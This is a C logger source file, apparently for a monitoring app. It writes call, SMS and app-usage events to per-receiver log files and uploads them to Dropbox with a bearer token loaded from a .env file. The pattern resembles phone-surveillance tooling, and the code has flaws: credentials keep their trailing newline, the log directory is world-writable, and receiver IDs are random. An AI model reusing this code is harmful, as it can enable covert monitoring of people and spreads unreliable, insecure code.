#include "logger.h"
#include <stdarg.h>
#include <stdio.h>
#include <time.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <curl/curl.h>

// Global variables for Dropbox credentials
static char DROPBOX_APP_KEY[1024] = {0};
static char DROPBOX_APP_SECRET[1024] = {0};
static char DROPBOX_ACCESS_TOKEN[1024] = {0};
static const char *DROPBOX_UPLOAD_URL = "https://content.dropboxapi.com/2/files/upload";

// Ensure the log directory exists
void initialize_logger(void) {
    // Check if the log directory exists, and if not, create it
    if (access(LOG_DIR, F_OK) == -1) {
        if (mkdir(LOG_DIR, 0777) == -1) {
            perror("Failed to create log directory");
            exit(1);
        }
    }
}

// Convert event type to string for logging
const char *event_type_to_string(event_type_t event) {
    switch (event) {
        case EVENT_CALL: return "CALL";
        case EVENT_SMS: return "SMS";
        case EVENT_APP_USAGE: return "APP_USAGE";
        // default: return "UNKNOWN";
    }
}

// Write a log entry to a file for a specific log ID
int write_log(log_id_t log_id, const char *tag, const char *msg) {
    char log_entry[LOG_BUF_SIZE];
    snprintf(log_entry, sizeof(log_entry), "[%s] [%s]: %s\n", tag, event_type_to_string(log_id), msg);

    // Get receiver ID and log the entry to the appropriate file
    int receiver_id = get_receiver_id();  // Retrieve receiver ID
    log_to_file(receiver_id, log_entry);

    return 0;
}

// Log a formatted message with variable arguments
int log_message(log_id_t log_id, const char *tag, const char *fmt, ...) {
    va_list args;
    va_start(args, fmt);
    char log_msg[LOG_BUF_SIZE];
    vsnprintf(log_msg, sizeof(log_msg), fmt, args);
    va_end(args);

    return write_log(log_id, tag, log_msg);
}

// Log an event (e.g., call, SMS, app usage) with details
void log_event(event_type_t event, const char *details) {
    const char *tag = event_type_to_string(event);  // Get event type as a string
    log_message(event, tag, "%s", details);  // Log the event with the provided details
}

// Write a log entry to a file for a specific receiver
void log_to_file(int receiver_id, const char *log_entry) {
    char log_file_path[256];
    get_log_file_path(receiver_id, log_file_path, sizeof(log_file_path));  // Get log file path

    FILE *log_file = fopen(log_file_path, "a");
    if (!log_file) {
        perror("Failed to open log file");
        return;
    }

    fputs(log_entry, log_file);  // Write log entry to the file
    fclose(log_file);
}

// Generate log file path based on receiver ID
void get_log_file_path(int receiver_id, char *file_path, size_t size) {
    snprintf(file_path, size, "%s/receiver_%d.log", LOG_DIR, receiver_id);
}

// Upload logs for a specific receiver to Dropbox
void upload_receiver_logs_to_dropbox(int receiver_id) {
    char log_file_path[256];
    get_log_file_path(receiver_id, log_file_path, sizeof(log_file_path));  // Get log file path
    upload_file_to_dropbox(log_file_path, "/path/to/dropbox/receiver_logs");  // Upload to Dropbox (path to be adjusted)
}

void upload_file_to_dropbox(const char *file_path, const char *dropbox_path) {
    CURL *curl = curl_easy_init();
    if (!curl) {
        fprintf(stderr, "Failed to initialize CURL\n");
        return;
    }

    FILE *file = fopen(file_path, "rb");
    if (!file) {
        perror("Failed to open file for upload");
        curl_easy_cleanup(curl);
        return;
    }

    // Get the size of the file
    fseek(file, 0L, SEEK_END);
    long file_size = ftell(file);
    fseek(file, 0L, SEEK_SET);

    // Prepare the headers
    struct curl_slist *headers = NULL;
    char auth_header[512];
    snprintf(auth_header, sizeof(auth_header), "Authorization: Bearer %s", DROPBOX_ACCESS_TOKEN);
    headers = curl_slist_append(headers, auth_header);
    headers = curl_slist_append(headers, "Content-Type: application/octet-stream");

    // Prepare the Dropbox API argument (file metadata)
    char dropbox_arg_header[1024];
    snprintf(dropbox_arg_header, sizeof(dropbox_arg_header),
             "Dropbox-API-Arg: {\"path\": \"%s\", \"mode\": \"overwrite\", \"autorename\": true}", dropbox_path);
    headers = curl_slist_append(headers, dropbox_arg_header);

    // Set CURL options
    curl_easy_setopt(curl, CURLOPT_URL, DROPBOX_UPLOAD_URL);
    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
    curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
    curl_easy_setopt(curl, CURLOPT_READDATA, file);
    curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, (curl_off_t)file_size);

    // Perform the upload
    CURLcode res = curl_easy_perform(curl);
    if (res != CURLE_OK) fprintf(stderr, "CURL upload failed: %s\n", curl_easy_strerror(res));
    else printf("File uploaded successfully to Dropbox: %s\n", dropbox_path);

    // Cleanup
    fclose(file);
    curl_easy_cleanup(curl);
    curl_slist_free_all(headers);
}

// Load environment variables from .env file
void load_env() {
    FILE *env_file = fopen(".env", "r");
    if (!env_file) {
        perror("Failed to open .env file");
        exit(EXIT_FAILURE);
    }

    char line[256];
    while (fgets(line, sizeof(line), env_file)) {
        if (strncmp(line, "APP_KEY=", 8) == 0) snprintf(DROPBOX_APP_KEY, sizeof(DROPBOX_APP_KEY), "%s", line + 8); 
        else if (strncmp(line, "APP_SECRET=", 11) == 0) snprintf(DROPBOX_APP_SECRET, sizeof(DROPBOX_APP_SECRET), "%s", line + 11);
        else if (strncmp(line, "ACCESS_TOKEN=", 13) == 0) snprintf(DROPBOX_ACCESS_TOKEN, sizeof(DROPBOX_ACCESS_TOKEN), "%s", line + 13);

        // Remove newline character if present
        char *newline = strchr(line, '\n');
        if (newline) *newline = '\0';
    }

    fclose(env_file);

    // Ensure all required keys are loaded
    if (strlen(DROPBOX_APP_KEY) == 0 || strlen(DROPBOX_APP_SECRET) == 0 || strlen(DROPBOX_ACCESS_TOKEN) == 0) {
        fprintf(stderr, "Missing required Dropbox credentials in .env file\n");
        exit(EXIT_FAILURE);
    }
}

// Placeholder to get receiver ID, you need to implement your own logic for retrieving this ID
int get_receiver_id() {
    return rand() % 10000 + 1;  // For example, generate a random receiver ID
}
